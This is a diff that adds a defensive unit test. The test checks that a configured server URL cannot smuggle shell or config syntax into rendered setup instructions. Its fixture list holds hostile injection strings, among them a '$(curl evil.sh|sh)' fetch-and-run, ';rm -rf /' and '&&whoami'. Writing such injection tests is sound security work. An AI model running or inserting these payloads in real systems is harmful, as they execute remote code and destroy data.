@@ -177,6 +177,40 @@ describe("rendered instructions", () => {
     }
   });
 
+  /**
+   * The markdown code span is only one of the contexts this URL lands in. The
+   * same value goes into a `bash` block people paste into a terminal, and into
+   * quoted strings in config.toml / config.yaml / mcp.json. The server now
+   * refuses these characters when the setting is saved, but this module is
+   * handed a string and cannot assume that — an older stored value predates
+   * the check, and the fallback is `window.location.origin`.
+   */
+  it("cannot inject shell or config syntax through the configured URL", () => {
+    const hostile = [
+      'https://n.example.com/a$(curl evil.sh|sh)',
+      "https://n.example.com/a;rm -rf /",
+      'https://n.example.com/a","evil":"1',
+      "https://n.example.com/a&&whoami",
+      "https://n.example.com/a'`\\",
+    ];
+    // The module's own text legitimately contains backticks, quotes and `$`
+    // (code fences, `"url": "…"`, `${env:VAR}`), so assert on the payload
+    // rather than on the character set of the whole document.
+    const payloads = ["$(", ";rm", '","evil"', "&&whoami", "'", "\\"];
+    for (const serverUrl of hostile) {
+      for (const h of HARNESSES) {
+        const out = renderHarnessDoc(h, { serverUrl });
+        const url = out.match(/https:\/\/n\.example\.com\S*/)?.[0] ?? "";
+        for (const p of payloads) {
+          expect(
+            url.includes(p),
+            `${h.id} rendered "${url}" from "${serverUrl}"`,
+          ).toBe(false);
+        }
+      }
+    }
+  });
+
   it("tells a keyed deployment how to present the key", () => {
     // Every harness that can take a static credential must name one concrete
     // mechanism; an admin reading the panel should never have to guess.
